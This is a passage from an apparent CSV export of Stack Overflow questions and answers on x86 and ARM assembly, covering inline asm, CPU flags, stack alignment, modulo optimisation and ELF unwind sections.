<p>You can not move a value from a 32-bit register to a single-byte memory location. <code>t</code> is on the stack and <code>x</code> is somewhere else, but both are accessed in the same way. Problems on the other lines are similar. You should move only a byte.</p>

<p>Try something like this, but there are more ways to do it (I haven't tried that, read below):</p>

<pre><code>unsigned char t;
asm(""movb %1, %%al\n""
     ""movb %%al, %0\n""
     :""=r""(t)
     :""r""(*x)
     :""%al"");
asm(""movb %1, %%al\n""
     ""movb %%al, %0\n""
     :""=r""(*x)
     :""r""(*y)
     :""%al"");
asm(""movb %1, %%al\n""
     ""movb %%al, %0\n""
     :""=r""(*y)
     :""r""(t)
     :""%al""); 
</code></pre>

<p>The whole procedure can be simplified into this:</p>

<pre><code>asm(""movb (%1), %%al\n""
    ""movb (%2), %%ah\n""
    ""movb %%ah, (%1)\n""
    ""movb %%al, (%2)\n""
    : /* no outputs for compiler to know about */
    : ""r"" (x), ""r"" (y)
    : ""%ax"", ""memory"");
</code></pre>
","24837538"
"What values can the carry flag hold, and how to check its status in x86 assembly?","8952","","<ol>
<li><p>What values can the carry flag hold? Is it just 0x00 and 0x01 (boolean) or is it 16 (or 32/64) bits like the rest of the CPU registers?</p></li>
<li><p>How do I check its status? Do I just use it like a normal CPU register like <code>cmp cf, 0x00</code> then <code>jg &lt;jump destination&gt;</code>?</p></li>
<li><p>I am writing a mini-OS. Is it good practice to use it for my own purposes, or should it be reserved for exclusive write-permissions for the CPU, and all I do is read from it?</p></li>
</ol>
","<p>It's a flag, it can only hold true or false (technically 1 or 0, but <em>effectively</em> the truth values as shown).</p>

<p>In terms of using it, no, you don't compare it to something and then use <code>jg</code>. It's at the <em>same</em> level of abstraction as other flags so you can just use:</p>

<pre><code>jc somewhere         ; jump if carry flag is set
jnc somewhere_else   ; jump if carry flag is not set
</code></pre>

<p>It's set automatically by certain instructions so, for example, to add two values and detect carry, you can use something like:</p>

<pre><code>add ax,bx
jc  too_big
</code></pre>

<p>And, while it's mostly set by those instructions, you can also do it manually with <code>stc</code> (set), <code>clc</code> (clear) and <code>cmc</code> (complement). For example, it's often useful to clear it before-hand if you're entering a loop where the value is carried forward to the next iteration.</p>
","14574739"
"GCC Inline Assembly: Jump to label outside block","8918","","<p>When using inline assembly under MSVC, one is allowed to jump outside of the assembly block by referencing a label in the C/C++ code, as explained <a href=""http://msdn.microsoft.com/en-us/library/aa279405(VS.60).aspx"" rel=""noreferrer"">in this MSDN article</a>.</p>

<p>Can such thing be done when using inline assembly under GCC?</p>

<p>Here's an example of what I'm trying to accomplish:</p>

<pre><code>__asm__ __volatile__ (
""   /* assembly code */ ""
""   jz external_label;  ""
);

/* some C code */

external_label:
/* C code coninues... */
</code></pre>

<p>The compiler, however, complains about ""external_label"" not being defined.</p>
","<p>What if you define the label with the assembler?</p>

<pre><code>asm(""external_label:"");
</code></pre>

<hr>

<p><strong>Update</strong>: this code seems to work:</p>

<pre><code>#include &lt;stdio.h&gt;

int
main(void)
{
  asm(""jmp label"");
  puts(""You should not see this."");
  asm(""label:"");

  return 0;
}
</code></pre>
","744108"
"asm change cmd background color","8904","","<p>I wrote the part that changes the text color, but I can't find a way to change the background color, this code is for tasm assembly:</p>

<pre><code>model small
stack 256
.data
ent db 0ah,0dh,'$'
array  db 2,4,5,6
       db 7,8,9,5
       db 1,2,3,4
       db 5,6,7,8
temp dw 0
.code
main :
    mov  ax,@data
    mov  ds,ax

    mov ah, 06h
    mov al, 0
    mov cx, 0
    mov dh, 79
    mov dl, 79
    mov bh, 4h

    int 10h
</code></pre>

<p>This is a my code but it doesn't work:</p>

<pre><code>  mov ah, 0bh
    mov bh, 01h
    mov bl, 2h

    int 10h

    mov ah, 02h
    mov dl, 34h

    int 21h


 mov ax,4c00h ; exit from program
 int 21h

end main
</code></pre>
","<p>In BIOS function 6, BH contains an 8-bit color. Its lower 4 bits specify the foreground color while the upper 4 bits specify the background color. Try, for example, <code>mov bh, 14h</code> instead of <code>mov bh, 4h</code>. It should start writing red on blue instead of red on black.</p>
","8554091"
"C++ try/throw/catch => machine code","8867","","<p>Mentally, I've always wondered how try/throw/catch looks behind the scenes, when the C++ compiles translates it to assembler. But since I never use it, I never got around to checking it out (some people would say lazy).</p>

<p>Is the normal stack used for keeping track of <code>try</code>s, or is a separate per-thread stack kept for this purpose alone? Is the implementation between MSVC and g++ big or small? Please show me some pseudo asm (IA-32 is ok too) so I never have to check it out myself! :)</p>

<p><strong>Edit:</strong> Now I get the basics of MSVC's implementation on IA-32 handling. Anybody know for g++ on IA-32, or any other CPU for that matter?</p>
","<p>Microsoft Journal's ""Under the Hood"" series did an in-depth look at that very subject back in 1997:</p>

<p><a href=""http://www.microsoft.com/msj/0197/Exception/Exception.aspx"" rel=""noreferrer"">A Crash Course on the Depths of Win32™ Structured Exception Handling</a></p>
","1331260"
"Why GCC compiled C program needs .eh_frame section?","8857","","<p>Test is on 32 bit x86 Linux with <code>gcc</code> 4.6.3</p>

<p>When using <code>gcc</code> to compile a <code>C</code> program and using <code>readelf</code> to check the section info, 
I can see the <code>.eh_frame</code> section and <code>.eh_frame_hdr</code> sections inside.</p>

<p>For example, here is the section info of binary program <code>Perlbench</code>.</p>

<pre><code>readelf -S perlbench

There are 28 section headers, starting at offset 0x102e48:

Section Headers:
[Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
[ 0]                   NULL            00000000 000000 000000 00      0   0  0
[ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
[ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
[ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4
[ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000044 04   A  5   0  4
[ 5] .dynsym           DYNSYM          080481f0 0001f0 0007b0 10   A  6   1  4
[ 6] .dynstr           STRTAB          080489a0 0009a0 0003d6 00   A  0   0  1
[ 7] .gnu.version      VERSYM          08048d76 000d76 0000f6 02   A  5   0  2
[ 8] .gnu.version_r    VERNEED         08048e6c 000e6c 0000a0 00   A  6   2  4
[ 9] .rel.dyn          REL             08048f0c 000f0c 000028 08   A  5   0  4
[10] .rel.plt          REL             08048f34 000f34 000388 08   A  5  12  4
[11] .init             PROGBITS        080492bc 0012bc 00002e 00  AX  0   0  4
[12] .plt              PROGBITS        080492f0 0012f0 000720 04  AX  0   0 16
[13] .text             PROGBITS        08049a10 001a10 0cf86c 00  AX  0   0 16
[14] .fini             PROGBITS        0811927c 0d127c 00001a 00  AX  0   0  4
[15] .rodata           PROGBITS        081192a0 0d12a0 017960 00   A  0   0 32
[16] .eh_frame_hdr     PROGBITS        08130c00 0e8c00 003604 00   A  0   0  4
[17] .eh_frame         PROGBITS        08134204 0ec204 01377c 00   A  0   0  4
[18] .ctors            PROGBITS        08148f0c 0fff0c 000008 00  WA  0   0  4
[19] .dtors            PROGBITS        08148f14 0fff14 000008 00  WA  0   0  4
[20] .jcr              PROGBITS        08148f1c 0fff1c 000004 00  WA  0   0  4
[21] .dynamic          DYNAMIC         08148f20 0fff20 0000d0 08  WA  6   0  4
[22] .got              PROGBITS        08148ff0 0ffff0 000004 04  WA  0   0  4
[23] .got.plt          PROGBITS        08148ff4 0ffff4 0001d0 04  WA  0   0  4
[24] .data             PROGBITS        081491e0 1001e0 002b50 00  WA  0   0 32
[25] .bss              NOBITS          0814bd40 102d30 002b60 00  WA  0   0 32
[26] .comment          PROGBITS        00000000 102d30 00002a 01  MS  0   0  1
[27] .shstrtab         STRTAB          00000000 102d5a 0000ec 00      0   0  1
</code></pre>

<p>In my understanding, these two sections are used for handling exceptions, it produce tables that describe how to unwind the stack.</p>

<p>But it is for <code>C++</code> program, they use <code>eh_frame</code> and <code>gcc_exception_table</code> sections to manage exceptions, then why does compiler put the <code>eh_frame</code> and <code>eh_frame_hdr</code> sections inside <code>ELF</code> compiled from <code>C</code> program?</p>
","<p>First of all, the original reason for this was largely political - the people who added DWARF-based unwinding (<code>.eh_frame</code>) wanted it to be a feature that's always there so it could be used for implementing all kinds of stuff other than just C++ exceptions, including:</p>

<ul>
<li><code>backtrace()</code></li>
<li><code>__attribute__((__cleanup__(f)))</code></li>
<li><code>__builtin_return_address(n)</code>, for <code>n&gt;0</code></li>
<li><code>pthread_cleanup_push</code>, implemented in terms of <code>__attribute__((__cleanup__(f)))</code></li>
<li>...</li>
</ul>

<p>However if you don't need any of these things, <code>.eh_frame</code> is something like a 15-30% increase to <code>.text</code> size with no benefit. You can disable generation of <code>.eh_frame</code> with <code>-fno-asynchronous-unwind-tables</code> for individual translation units, and this mostly eliminates the size cost, although you still have a few left over coming from <code>crtbegin.o</code>, etc. You <em>cannot</em> strip them with the <code>strip</code> command later; since <code>.eh_frame</code> is a section that lives in the loaded part of the program (this is the whole point), stripping it modifies the binary in ways that break it at runtime. See <a href=""https://sourceware.org/bugzilla/show_bug.cgi?id=14037"">https://sourceware.org/bugzilla/show_bug.cgi?id=14037</a> for an example of how things can break.</p>

<p>Note that DWARF tables are also used for debugging, but for this purpose they do not need to be in the loadable part of the program. Using <code>-fno-asynchronous-unwind-tables</code> will not break debugging, because as long as <code>-g</code> is also passed to the compiler, the tables still get generated; they just get stored in a separate, non-loadable, strippable section of the binary, <code>.debug_frame</code>.</p>
","26302715"
"Why is it not possible to push a byte onto a stack on Pentium IA-32?","8854","","<p>I've come to learn that you cannot push a byte directly onto the Intel Pentium's stack, can anyone explain this to me please?</p>

<p>The reason that I've been given is because the esp register is word-addressable (or, that is the assumption in our model) and it must be an ""even address"". I would have assumed decrementing the value of some 32-bit binary number wouldn't mess with the alignment of the register, but apparently I don't understand enough.</p>

<p>I have tried some NASM tests and come up that if I declare a variable (bite db 123) and push it on to the stack, esp is decremented by 4 (indicating that it pushed 32-bits?). But, ""push byte bite"" (sorry for my choice of variable names) will result in a kind error:</p>

<p>test.asm:10: error: Unsupported non-32-bit ELF relocation</p>

<p>Any words of wisdom would be greatly appreciated during this troubled time. I am first year undergraduate so sorry for my naivety in any of this.</p>
","<p>Its based on how the stack was created:</p>

<blockquote>
  <p>The address-size attribute of the
  stack segment determines the stack
  pointer size (16, 32 or 64 bits). The
  operand-size attribute of the current
  code segment determines the amount the
  stack pointer is decremented (2, 4 or
  8 bytes).</p>
  
  <p>In non-64-bit modes: if the
  address-size and operand-size
  attributes are 32, the 32-bit ESP
  register (stack pointer) is
  decremented by 4. If both attributes
  are 16, the 16-bit SP register (stack
  pointer) is decremented by 2.</p>
</blockquote>

<p>Source: <a href=""http://www.intel.com/Assets/PDF/manual/253667.pdf"" rel=""nofollow noreferrer"">http://www.intel.com/Assets/PDF/manual/253667.pdf</a></p>

<p>pg. 4-320 Vol. 2B</p>

<p><em>Edit</em></p>

<p>Just wanted to point out also that an interesting read is the section on stacks in the manual, it will explain creating a stack segment further.</p>

<p><a href=""http://www.intel.com/Assets/PDF/manual/253665.pdf"" rel=""nofollow noreferrer"">http://www.intel.com/Assets/PDF/manual/253665.pdf</a></p>

<p>Chapter 6.2</p>
","2586647"
"What techniques to avoid conditional branching do you know?","8846","","<p>Sometimes a loop where the CPU spends most of the time has some branch prediction miss (misprediction) very often (near .5 probability.) I've seen a few techniques on very isolated threads but never a list. The ones I know already fix situations where the condition can be turned to a bool and that 0/1 is used in some way to change. Are there other conditional branches that can be avoided?</p>

<p>e.g. (pseudocode)</p>

<pre><code>loop () {
  if (in[i] &lt; C )
    out[o++] = in[i++]
  ...
}
</code></pre>

<p>Can be rewritten, arguably losing some readability, with something like this:</p>

<pre><code>loop() {
  out[o] = in[i]  // copy anyway, just don't increment
  inc = in[i] &lt; C  // increment counters? (0 or 1)
  o += inc
  i += inc
}
</code></pre>

<p>Also I've seen techniques in the wild changing <code>&amp;&amp;</code> to <code>&amp;</code> in the conditional in certain contexts escaping my mind right now. I'm a rookie at this level of optimization but it sure feels like there's got to be more.</p>
","<p>I believe the most common way to avoid branching is to leverage bit parallelism in reducing the total jumps present in your code. The longer the basic blocks, the less often the pipeline is flushed.</p>

<p>As someone else has mentioned, if you want to do more than unrolling loops, and providing branch hints, you're going to want to drop into assembly. Of course this should be done with utmost caution: your typical compiler can write better assembly in most cases than a human. Your best hope is to shave off rough edges, and make assumptions that the compiler cannot deduce.</p>

<p>Here's an example of the following C code:</p>

<pre><code>if (b &gt; a) b = a;
</code></pre>

<p>In assembly without any jumps, by using bit-manipulation (and extreme commenting):</p>

<pre><code>sub eax, ebx ; = a - b
sbb edx, edx ; = (b &gt; a) ? 0xFFFFFFFF : 0
and edx, eax ; = (b &gt; a) ? a - b : 0
add ebx, edx ; b = (b &gt; a) ? b + (a - b) : b + 0
</code></pre>

<p>Note that while conditional moves are immediately jumped on by assembly enthusiasts, that's only because they're easily understood and provide a higher level language concept in a convenient single instruction. They are not necessarily faster, not available on older processors, and by mapping your C code into corresponding conditional move instructions you're just doing the work of the compiler.</p>
","1619778"
"How to print a string in reverse order in a .COM executable?","8834","","<p>I have just started to learn assembly language and i am trying to print ""hello world"" in reverse order that means ""dlrow olleh"".the problem is i am getting only 1st letter as output and the order is still same no change at all!As a newbie many thing  is unknown to me and i am doing lots of mistakes and i am unable to identify them due to lack of knowledge.So any answer with proper explanation will be appreciated!Here is my code:</p>

<pre><code>name ""hi"" ; can anybody explain what is the use of this?

org 100h

jmp start       ; jump over data declaration

msg    db      ""1Hello, World!"",0;last character           
msg1   db      ""1""

Mov   SI,13;lenght of the string
start: 

Mov  AL,msg[SI]
DEC SI 

Mov  ah ,0eh
int 10h   
mov BL,msg1

CMP msg[SI],BL;comparing to get the end of the string
je stop

jmp start                     

stop:
mov     ah, 0 
int     16h      ; wait for any key....
ret ; return to operating system.
</code></pre>

<p>i am getting  output only ""1"" which is the first letter,but i expected  to get the whole string in reverse order</p>
","<pre><code>jmp start       ; jump over data declaratio
...
Mov   SI,13;lenght of the string
start: 
</code></pre>

<p>here is the problem - you're not initializing register <code>si</code></p>

<p>you need to use something like:</p>

<pre><code>jmp init       ; jump over data declaratio
...
init:
Mov   SI,13;lenght of the string
start: 
</code></pre>
","26368696"
"comparing characters in assembly, nasm","8793","","<p>i am trying to get input from the user and then i would like to output some text depending on what the user put in.</p>

<p>my issue is for some reason it always thinks it is A and i dont know why.
you can find my code below:</p>

<pre><code>            bits 16
            org 0x100
            jmp main
message:    db 'Please enter a A or B:',0ah,0dh,'$'
character:  db 1
outp_a:     db 'IT IS A',0ah,0dh,'$'
outp_b:     db 'IT IS B',0ah,0dh,'$'
finish      db 'good bye',0ah,0dh,'$'

clearscreen:
            mov dx, 10 
            mov bh, 0
            mov ah, 2
            int 10h
            mov cx, 2000 
            mov bh, 0
            mov bl, 01Eh 
            mov al, 20h 
            mov ah, 09h
            int 10h
            ret

disply:     
            mov ah,09h
            int 21h
            ret

get_input:  mov ah,01h
            int 21h
            ret

input_a:    mov dx,outp_a
            call disply
            ret
input_b:    mov dx,outp_b
            call disply
            ret

compare:    mov cl,'A'
            cmp [character],cl
            JAE input_a
            mov cl,'B'
            cmp [character],cl
            JAE input_b 
            ret

main:       call clearscreen
            mov dx,message
            call disply
            call get_input
            mov [character],ax
            call compare
            mov dx,finish
            call disply
            int 20h
</code></pre>
","<p><code>JAE</code> means jump if above or equal, that is to say when you compare to 'A', the jump will be taken for any character with an encoding greater or equal to 'A'.</p>

<p>What you want instead is <code>JE</code>, which means jump only if the values are exactly the same.</p>
","22987633"
"pop or add esp, 4 ? What is the difference?","8781","","<p>I saw <a href=""https://stackoverflow.com/questions/2038416/smaller-instruction-than-add-esp-4"">this</a> question, but I didn't find my answer in it..</p>

<p>So, why would I prefer to use <code>add esp, 4</code> or <code>add esp, 8</code> instead of using <code>pop</code> one or two times? Is there any difference (performance, safety, etc.) at all or it's a matter of personal choice?</p>
","<p><code>pop</code> does <code>add esp, 4</code> too, it simply saves whatever there is on the top of the stack in its operand before. If you need what's on the stack probably <code>pop</code> is faster than <code>mov wherever, [esp]; add esp, 4</code> but if you simply need to clear the stack <code>add esp, 4</code> will be fine.</p>
","5904222"
"what does eax have after mov eax,dword ptr [edi]","8778","","<p>I have the following assembly code on Windows and I want to make sure that I understand correctly.
<code>edi</code> contains some address i.e. <code>0x6090F454</code></p>

<p>In this case, what should <code>eax</code> have after the first <code>mov</code> instruction?</p>

<pre><code>775672f3  mov eax,dword ptr [edi]

775672f5  mov dword ptr [ebp-50h],0 
775672fc  mov dword ptr [ebp-48h],0 

77567303  cmp eax,0FFFFFFFFh 
</code></pre>

<p>It seems to me that <code>eax</code> must have the value but I am not so sure about that.
For your information, C++ code for the above assembly is</p>

<pre><code>if (sem-&gt;num != INVALID_FLAG) {
    ....
}
</code></pre>

<p>Also, here is what's store in edi.</p>

<pre><code>0:024&gt; dd edi
6090f454  0c0e8fe0 ffffffff 00000000 00000000
</code></pre>

<p>Thank you in advance.</p>
","<p>The line:</p>

<pre><code>mov eax,dword ptr [edi]
</code></pre>

<p>will simply load whatever is stored at the address <code>edi</code>. So it's a simple data load.</p>

<p>Since you don't show what is at address <code>edi</code> (<code>0x6090F434</code>), we can't tell you exactly what <code>eax</code> will be.</p>

<p>Based on the C++ code that is given, it looks like <code>edi</code> is the address of the <code>num</code> field. So it's reading <code>num</code> into a register, then comparing it against <code>0xFFFFFFFF</code> which is the <code>INVALID_FLAG</code> constant.</p>
","8825023"
"__do_global_dtors_aux and __do_global_ctors_aux","8765","","<p>I disassembled a simple program written in C++ and there are these two function names. I guess that ctor means constructor and dtor means destructor, and word global maybe means that they create and destroy global objects. I cannot guess the name aux. What do these two functions do?</p>
","<p>The addresses of <em>constructors</em> and <em>destructors</em> of static objects are each stored in a different section in <em>ELF executable</em>. for the constructors there is a section called <strong>.CTORS</strong> and for the destructors there is the <strong>.DTORS</strong> section.  </p>

<p>the compiler creates two auxillary functions <strong>__do_global_ctors_aux</strong> and <strong>__do_global_dtors_aux</strong> for calling the constructors and destructors of these static objects, respectively.</p>

<p><strong>__do_global_ctors_aux</strong> function simply performs a walk on the <strong>.CTORS</strong> section, while the <strong>__do_global_dtors_aux</strong> does the same job only for the <strong>.DTORS</strong> section which contains the program specified destructors functions.</p>
","6477522"
"How does the GCC implementation of modulo (%) work, and why does it not use the div instruction?","8763","","<p>I was trying to work out how to calculate modulo 10 in assembly so i compiled the following c code in gcc to see what it came up with.</p>

<pre><code>unsigned int i=999;
unsigned int j=i%10;
</code></pre>

<p>To my surprise I got</p>

<pre><code>movl    -4(%ebp), %ecx
movl    $-858993459, %edx
movl    %ecx, %eax
mull    %edx
shrl    $3, %edx
movl    %edx, %eax
sall    $2, %eax
addl    %edx, %eax
addl    %eax, %eax
movl    %ecx, %edx
subl    %eax, %edx
movl    %edx, %eax
movl    %eax, -12(%ebp)
</code></pre>

<p>Where -4(%ebp) or ""i"" is the input and -12(%ebp) or ""j"" is the answer. I've tested this and it does work no matter what number you make -4(%ebp).</p>

<p>My question is how does this code work and how is it better than using the div operand.</p>
","<p>Second question first: <code>div</code> is a very slow instruction (more than 20 clock cycles). The sequence above consists of more instructions, but they're all relatively fast, so it's a net win in terms of speed.</p>

<p>The first five instructions (up to and including the <code>shrl</code>) compute i/10 (I'll explain how in a minute).</p>

<p>The next few instructions multiply the result by 10 again, but avoiding the <code>mul</code>/<code>imul</code> instructions (whether this is a win or not depends on the exact processor you're targeting - newer x86s have very fast multipliers, but older ones don't).</p>

<pre><code>movl    %edx, %eax   ; eax=i/10
sall    $2, %eax     ; eax=(i/10)*4
addl    %edx, %eax   ; eax=(i/10)*4 + (i/10) = (i/10)*5
addl    %eax, %eax   ; eax=(i/10)*5*2 = (i/10)*10
</code></pre>

<p>This is then subtracted from <code>i</code> again to obtain <code>i - (i/10)*10</code> which is <code>i % 10</code> (for unsigned numbers).</p>

<p>Finally, on the computation of i/10: The basic idea is to replace division by 10 with multiplication by 1/10. The compiler does a fixed-point approximation of this by multiplying with (2**35 / 10 + 1) - that's the magic value loaded into <code>edx</code>, though it's output as a signed value even though it's really unsigned - and right-shifting the result by 35. This turns out to give the right result for all 32-bit integers.</p>

<p>There's algorithms to determine this kind of approximation which guarantee that the error is less than 1 (which for integers means it's the right value) and GCC obviously uses one :)</p>

<p>Final remark: If you want to actually see GCC compute a modulo, make the divisor variable (e.g. a function parameter) so it can't do this kind of optimization. Anyway, on x86, you compute modulo using <code>div</code>. <code>div</code> expects the 64-bit dividend in <code>edx:eax</code> (high 32 bits in edx, low 32 bits in eax - clear edx to zero if you're working with a 32-bit number) and divides that by whatever operand you specify (e.g. <code>div ebx</code> divides <code>edx:eax</code> by <code>ebx</code>). It returns the quotient in <code>eax</code> and the remainder in <code>edx</code>. <code>idiv</code> does the same for signed values.</p>
","4362081"
"x86 where stack pointer points?","8748","","<p>For example if I pushed ax is [SP] points to my value of ax or the word after ax? Also is it differs from real mode to protected mode? I ask this because the Art of assembly book illustrates and explains as the sp points to last pushed data, and on this page <a href=""http://wiki.osdev.org/Stack"" rel=""noreferrer"">OSDev Wiki - Stack</a> it illustrated as it points to empty word after last pushed data.</p>
","<p>Wikipedia says <a href=""http://en.wikipedia.org/wiki/X86_assembly_language"">here</a>:</p>

<blockquote>
  <p>The stack is implemented with an implicitly decrementing (push) and
  incrementing (pop) stack pointer. In 16-bit mode, this implicit stack
  pointer is addressed as SS:[SP], in 32-bit mode it is SS:[ESP], and in
  64-bit mode it is [RSP]. <strong>The stack pointer actually points to the last
  value that was stored</strong>, under the assumption that its size will match
  the operating mode of the processor (i.e., 16, 32, or 64 bits) to
  match the default width of the push/pop/call/ret instructions.</p>
</blockquote>

<p>This is the way my way-back memory says it works, too.</p>
","14060503"
"ARM: Why do I need to push/pop two registers at function calls?","8744","","<p>I understand that I need to push the Link Register at the beginning of a function call, and pop that value to the Program Couter before returning, so that the execution can carry one from where it was before the function call.</p>

<p>What I don't understand is why most people do this by adding an extra register to the push/pop. For instance:</p>

<pre><code>push {ip, lr}
...
pop {ip, pc}
</code></pre>

<p>For instance, here's a Hello World in ARM, provided by the <a href=""http://blogs.arm.com/software-enablement/139-hello-world-in-assembly/"" rel=""noreferrer"">official ARM blog</a>:</p>

<pre><code>.syntax unified

    @ --------------------------------
    .global main
main:
    @ Stack the return address (lr) in addition to a dummy register (ip) to
    @ keep the stack 8-byte aligned.
    push    {ip, lr}

    @ Load the argument and perform the call. This is like 'printf(""..."")' in C.
    ldr     r0, =message
    bl      printf

    @ Exit from 'main'. This is like 'return 0' in C.
    mov     r0, #0      @ Return 0.
    @ Pop the dummy ip to reverse our alignment fix, and pop the original lr
    @ value directly into pc — the Program Counter — to return.
    pop     {ip, pc}

    @ --------------------------------
    @ Data for the printf calls. The GNU assembler's "".asciz"" directive
    @ automatically adds a NULL character termination.
message:
    .asciz  ""Hello, world.\n""
</code></pre>

<p><strong>Question 1</strong>: what's the reason for the ""dummy register"" as they call it? Why not simply push{lr} and pop{pc}? They say it's to keep the stack 8-byte aligned, but ain't the stack 4-byte aligned?</p>

<p><strong>Question 2</strong>: what register is ""ip"" (i.e., r7 or what?)</p>
","<blockquote>
  <p>what's the reason for the ""dummy register"" as they call it? Why not simply push{lr} and pop{pc}? They say it's to keep the stack 8-byte aligned, but ain't the stack 4-byte aligned?</p>
</blockquote>

<p><strike>The stack only requires 4-byte alignment; but</strike> if the data bus is 64 bits wide (as it is on many modern ARMs), it's more efficient to keep it at an 8-byte alignment. Then, for example, if you call a function that <em>needs</em> to stack two registers, that can be done in a single 64-bit write rather than two 32-bit writes.</p>

<p>UPDATE: Apparently it's not just for efficiency; it's a requirement of the official procedure call standard, as noted in the comments.</p>

<p>If you're targetting older 32-bit ARMs, then the extra stacked register might degrade performance slightly.</p>

<blockquote>
  <p>what register is ""ip"" (i.e., r7 or what?)</p>
</blockquote>

<p><code>r12</code>. See, for example, <a href=""http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.dui0041c/ch09s02s02.html"" rel=""nofollow"">here</a> for the full set of register aliases used by the procedure call standard.</p>
","16120399"
"How to determine when zero flag, sign flag, overflow flag and carry flag are set?","8743","","<p>The whole flag thing is confusing the heck out of me. The definitions on the web seem really plain. I can't seem to get a really good applicable explanation to all this. </p>

<p>According to their definitions, 
- carry: indicates an unsigned integer overflow
- overflow: indicates a signed integer overflow
- zero: an operation produced zero
- sign: operation produced a negative number</p>

<p>So how in the world are the following sentences true?
- The following instructions will set the Sign flag: (The answer here is 252 not a negative number. So why is the sign flag set?)</p>

<pre><code>mov al,0FEh
sub al,2
</code></pre>

<ul>
<li><p>Adding 7Fh and 05h in an 8-bit register sets the Overflow flag.(The answer here is 132. It’s not above 255 so why is there an overflow?)</p></li>
<li><p>Adding 0FFh and 05h in an 8-bit register does not set the Overflow flag.(the answer is 300 so how is there not an overflow flag on? It’s above 256)</p></li>
<li><p>Adding 5 to 0FBh in an 8-bit register sets the Zero flag  (The answer here is 256, not 0. I understand the 8 bit can only hold 255 but where does the “0” come from? I just don’t get it.)</p></li>
</ul>

<p>Can someone please let me know what I'm doing wrong here and what the correct way to approach this is?
Thanks.</p>
","<blockquote>
  <p>The answer here is 252 not a negative number. So why is the sign flag set?</p>
</blockquote>

<p>As <em>unsigned</em> it is 252, but unsigned can't have a sign, so the sign flag is only related to number handled as <em>signed</em>. It doesn't matter how you handle it, the processor always handles it as signed with the sign flag. So 252 is over 127, therefore it is negative in 2's complement and the sign bit is set.</p>

<blockquote>
  <p>Adding 7Fh and 05h in an 8-bit register sets the Overflow flag.(The answer here is 132. It’s not above 255 so why is there an overflow?)</p>
</blockquote>

<p>As you said, overflow is set when a <em>signed</em> number would overflow. A signed 8bit variable can go from -128 to 127. Therefore going from 127 to 132 is an overflow.</p>

<blockquote>
  <p>Adding 0FFh and 05h in an 8-bit register does not set the Overflow flag.(the answer is 300 so how is there not an overflow flag on? It’s above 256)</p>
</blockquote>

<p>Again, overflow is <em>signed</em> overflow. This causes an <em>unsigned</em> overflow, so the <em>carry</em> bit will be set.</p>

<blockquote>
  <p>Adding 5 to 0FBh in an 8-bit register sets the Zero flag (The answer here is 256, not 0. I understand the 8 bit can only hold 255 but where does the “0” come from? I just don’t get it.)</p>
</blockquote>

<p>As you said, 8 bits can go up to 255. After that it <em>overflows</em> and the lowest 8 bits are 0. So the result is zero and the zero bit is set. </p>
","36583590"
"Putting two numbers into the EAX register","8732","","<p>Im trying to multiply two 16 bit numbers with the following NASM codes:</p>

<pre><code>mov ax, [input1]
mov bx, [input2]
mul bx
</code></pre>

<p>The result of the previous codes is stored in DX:AX</p>

<p>Im trying to print the integer to the screen using a function from a separate library ""print_int"". But print_int requires that the integer must be in the EAX register.</p>

<p>How can i put the 32-bit integer in the EAX register?</p>

<p><strong>Update</strong></p>

<p>I came up with this</p>

<pre><code>mov cx, dx  ;move upper half(16 bits) of result in cx
shl ecx, 16 ;shift the contents of ecx 16 bits to the left
mov cx, ax  ;move lower half(16 bits) of result in cx
</code></pre>
","<p>Like this:</p>

<pre><code>; Before: 
; Result is in DX:AX on the form ABCD:EFGH
; EAX = ????EFGH : AX contains EFGH, upper part of EAX has unknown content
; EDX = ????ABCD : DX contains ABCD (the 16 most siginficant bits 
;                                   of the multiplication result) 
;                                   like with EAX the upper (=most siginifcant) 
;                                   16 bits of EDX also has unknown content.

and eax, 0x0000ffff ; clear upper bits of eax
; EAX = 0000EFGH

shl edx, 16 ; shift DX into position (will just shift the upper 16 junk bits away)
; EDX = ABCD000

or eax, edx ; combine in eax
; EAX = ABCDEFGH
</code></pre>

<p>The reason why this works is that <code>ax</code> refers to the 16 least significant bits of <code>eax</code>. Fore more detail see <a href=""https://stackoverflow.com/questions/228200/x86-assembly-registers-why-do-they-work-the-way-they-do"">this</a> SO question and the accepted answer. This method will also work for <code>imul</code>, but usually you have to be careful when dealing with signed numbers in assembly code. </p>

<p>A complete example: </p>

<pre><code>    bits 32

    extern printf
    global main

    section .text
main:
    push ebx
    mov ax, 0x1234
    mov bx, 0x10
    mul bx
    and eax, 0x0000ffff ; clear upper bits of eax
    shl edx, 16 ; shift DX into position
    or eax, edx ; and combine
    push eax
    push format
    call printf
    add esp, 8
    mov eax, 0
    pop ebx
    ret

    section .data
format: db ""result = %8.8X"",10,0
</code></pre>

<p>Compile with:</p>

<pre><code>nasm -f elf32 -g -o test.o test.asm
gcc -m32 -o test test.o
</code></pre>

<p>Update:</p>

<p>On 32-bit machines it is usually easier and preferable to deal with 32-bit values if it is reasonable in the context. For example:</p>

<pre><code>    movzx eax, word [input1] ; Load 16-bit value and zero-extend into eax
    movzx edx, word [input2] ; Use movsx if you want to work on signed values
    mul eax, edx ; eax *= edx
</code></pre>

<p>Which also shows the usage of one of the newer, easier to use, <code>mul</code> instructions. You can also do as you're doing now and <code>mov ax, [input1]</code> and then later extend the size with <code>movzx eax, ax</code>.  </p>
","7077895"
"How are the fs/gs registers used in Linux AMD64?","8730","","<p>On the x86-64 architecture, two registers have a special purpose: FS and GS. In linux 2.6.*, the FS register seem to be used to store thread-local information.</p>

<ul>
<li>Is that correct?</li>
<li>What is stored at fs:0? Is there any C structure that describe this content?</li>
<li>What is then the use of GS?</li>
</ul>
","<p>In x86-64 there are <a href=""http://lxr.free-electrons.com/source/arch/x86/include/asm/segment.h?v=2.6.39#L170"" rel=""noreferrer"">3 TLS entries</a>, two of them accesible via <a href=""http://lxr.free-electrons.com/source/arch/x86/include/asm/segment.h?v=2.6.39#L176"" rel=""noreferrer"">FS and GS</a>, FS is used internally by glibc (in IA32 apparently <a href=""http://lxr.free-electrons.com/source/arch/x86/include/asm/segment.h?v=2.6.39#L40"" rel=""noreferrer"">FS is used by Wine and GS by glibc</a>).</p>

